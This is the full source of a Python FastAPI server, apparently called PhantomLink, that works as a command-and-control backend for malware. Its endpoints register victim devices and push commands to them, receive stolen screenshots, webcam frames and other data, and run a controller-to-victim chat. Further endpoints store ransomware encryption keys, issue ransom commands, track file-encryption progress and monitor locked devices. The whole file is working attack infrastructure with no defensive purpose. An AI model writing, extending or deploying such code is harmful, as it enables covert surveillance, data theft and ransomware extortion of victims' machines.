# main.py | PhantomLink v5.1 + PrankLock | FastAPI | Render
# requirements.txt:
#   fastapi
#   uvicorn
#   pydantic

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import time, threading

app = FastAPI(title="PhantomLink v5.1", docs_url=None, redoc_url=None)
app.add_middleware(CORSMiddleware,
    allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

SECRET         = "phantomlink2025"
DEVICE_TIMEOUT = 30

devices     = {}
commands    = {}
screenshots = {}
cam_frames  = {}
data_store  = {}
chat_c2v    = {}
chat_v2c    = {}
enc_keys    = {}
ransom_cmds = {}
prank_store = {}   # device_id -> {locked, attempts, enc_count}

_lk = threading.Lock()

def _auth(s):
    if s != SECRET:
        raise HTTPException(403, "forbidden")

# ── Models ────────────────────────────────────────────────────────
class HB(BaseModel):
    secret:str; device_id:str; username:str; ip:str
    version:str="?"; hostname:str=""; os_info:str=""

class Send(BaseModel):
    secret:str; action:str; data:str=""; target:str="all"

class SS(BaseModel):
    secret:str; device_id:str; image:str; w:int=1920; h:int=1080

class CF(BaseModel):
    secret:str; device_id:str; image:str

class Data(BaseModel):
    secret:str; device_id:str; type:str; payload:str

class Chat(BaseModel):
    secret:str; device_id:str; msg:str; sender:str="controller"

class KeyStore(BaseModel):
    secret:str; device_id:str; key:str; status:str="encrypted"

class RansomCmd(BaseModel):
    secret:str; device_id:str; cmd:str; data:str=""

class RansomStatus(BaseModel):
    secret:str; device_id:str; status:str; files_count:int=0; files_done:int=0

class PrankStatus(BaseModel):
    secret:str; device_id:str
    locked:bool=True; attempts:int=0; enc_count:int=0

# ── Core endpoints ────────────────────────────────────────────────
@app.get("/")
def root(): return {"status": "PhantomLink v5.1 online"}

@app.get("/ping")
def ping(): return {"ok": True, "ts": time.time()}

@app.post("/heartbeat")
def heartbeat(b: HB):
    _auth(b.secret)
    with _lk:
        devices[b.device_id] = {
            "name": b.username, "ip": b.ip, "version": b.version,
            "hostname": b.hostname, "os": b.os_info,
            "last_seen": time.time(),
        }
        if b.device_id not in commands:
            commands[b.device_id] = {"action": "none", "data": ""}
    return {"ok": True}

@app.get("/poll")
def poll(secret:str, device_id:str):
    _auth(secret)
    with _lk:
        cmd = commands.get(device_id, {"action":"none","data":""})
        commands[device_id] = {"action":"none","data":""}
    return cmd

@app.post("/send")
def send(b: Send):
    _auth(b.secret)
    cmd = {"action": b.action, "data": b.data}
    with _lk:
        if b.target == "all":
            for did in devices: commands[did] = cmd
        else:
            commands[b.target] = cmd
    return {"ok": True}

@app.post("/screenshot")
def upload_ss(b: SS):
    _auth(b.secret)
    with _lk:
        screenshots[b.device_id] = {
            "image": b.image, "w": b.w, "h": b.h, "ts": time.time()
        }
    return {"ok": True}

@app.get("/screenshot")
def get_ss(secret:str, device_id:str):
    _auth(secret)
    with _lk:
        d = screenshots.get(device_id, {})
    return {"image": d.get("image"), "w": d.get("w",1920), "h": d.get("h",1080)}

@app.post("/camframe")
def upload_cam(b: CF):
    _auth(b.secret)
    with _lk: cam_frames[b.device_id] = b.image
    return {"ok": True}

@app.get("/camframe")
def get_cam(secret:str, device_id:str):
    _auth(secret)
    with _lk: return {"image": cam_frames.get(device_id)}

@app.post("/data")
def upload_data(b: Data):
    _auth(b.secret)
    with _lk:
        bucket = data_store.setdefault(b.device_id, [])
        bucket.append({"type": b.type, "payload": b.payload, "ts": time.time()})
        if len(bucket) > 50: data_store[b.device_id] = bucket[-50:]
    return {"ok": True}

@app.get("/data")
def get_data(secret:str, device_id:str):
    _auth(secret)
    with _lk:
        items = list(data_store.get(device_id, []))
        data_store[device_id] = []
    return {"items": items}

@app.post("/chat")
def post_chat(b: Chat):
    _auth(b.secret)
    with _lk:
        if b.sender == "controller":
            bucket = chat_c2v.setdefault(b.device_id, [])
            bucket.append({"msg": b.msg, "ts": time.time()})
            if len(bucket) > 100: chat_c2v[b.device_id] = bucket[-100:]
        else:
            bucket = chat_v2c.setdefault(b.device_id, [])
            bucket.append({"msg": b.msg, "ts": time.time()})
            if len(bucket) > 100: chat_v2c[b.device_id] = bucket[-100:]
    return {"ok": True}

@app.get("/chat")
def get_chat(secret:str, device_id:str, sender:str="controller"):
    _auth(secret)
    with _lk:
        if sender == "controller":
            msgs = list(chat_c2v.get(device_id, []))
            chat_c2v[device_id] = []
        else:
            msgs = list(chat_v2c.get(device_id, []))
            chat_v2c[device_id] = []
    return {"msgs": msgs}

@app.get("/devices")
def list_devices(secret:str):
    _auth(secret)
    now = time.time()
    with _lk:
        return {
            did: {**info, "online": (now - info["last_seen"]) < DEVICE_TIMEOUT}
            for did, info in devices.items()
        }

# ── Ransom / enc endpoints ─────────────────────────────────────────
@app.post("/key")
def store_key(b: KeyStore):
    _auth(b.secret)
    with _lk:
        enc_keys[b.device_id] = {"key": b.key, "status": b.status, "ts": time.time()}
    return {"ok": True}

@app.get("/key")
def get_key(secret:str, device_id:str):
    _auth(secret)
    with _lk:
        return enc_keys.get(device_id, {"key":None,"status":"none","ts":0})

@app.post("/ransom_cmd")
def post_ransom_cmd(b: RansomCmd):
    _auth(b.secret)
    with _lk:
        ransom_cmds[b.device_id] = {"cmd": b.cmd, "data": b.data}
    return {"ok": True}

@app.get("/ransom_cmd")
def get_ransom_cmd(secret:str, device_id:str):
    _auth(secret)
    with _lk:
        cmd = ransom_cmds.get(device_id, {"cmd":"none","data":""})
        ransom_cmds[device_id] = {"cmd":"none","data":""}
    return cmd

@app.post("/ransom_status")
def post_ransom_status(b: RansomStatus):
    _auth(b.secret)
    with _lk:
        ex = enc_keys.get(b.device_id, {})
        ex.update({"status":b.status,"files_count":b.files_count,
                   "files_done":b.files_done,"ts_update":time.time()})
        enc_keys[b.device_id] = ex
    return {"ok": True}

@app.get("/ransom_all")
def get_ransom_all(secret:str):
    _auth(secret)
    with _lk: return dict(enc_keys)

# ── PrankLock endpoints ────────────────────────────────────────────
@app.post("/prank_status")
def post_prank_status(b: PrankStatus):
    """الـ client بيرفع حالة القفل هنا"""
    _auth(b.secret)
    with _lk:
        prank_store[b.device_id] = {
            "locked": b.locked,
            "attempts": b.attempts,
            "enc_count": b.enc_count,
            "ts": time.time(),
        }
    return {"ok": True}

@app.get("/prank_status")
def get_prank_status(secret:str, device_id:str):
    """الـ control panel بيقرأ الحالة"""
    _auth(secret)
    with _lk:
        return prank_store.get(device_id,
            {"locked":False,"attempts":0,"enc_count":0,"ts":0})

@app.get("/prank_all")
def get_prank_all(secret:str):
    """كل الأجهزة المقفولة دفعة واحدة"""
    _auth(secret)
    with _lk:
        return dict(prank_store)
            
